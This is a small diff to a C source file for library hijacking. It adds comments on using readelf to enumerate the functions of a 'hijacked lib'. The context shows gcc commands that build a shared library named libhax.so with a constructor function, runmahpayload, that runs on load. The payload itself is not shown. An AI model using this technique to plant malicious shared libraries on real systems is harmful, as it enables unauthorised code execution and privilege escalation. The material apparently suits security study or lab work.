@@ -2,6 +2,10 @@
 #include <stdlib.h>
 #include <unistd.h> 
 
+// Output of: readelf -s --wide <hijacked lib> | grep FUNC | awk '{print $8}'
+// int myvar;
+
+
 // gcc -Wall -fPIC -c -o hax.o simpleLdLibraryHijacking.c
 // gcc -shared -o libhax.so hax.o
 static void runmahpayload() __attribute__((constructor)); 
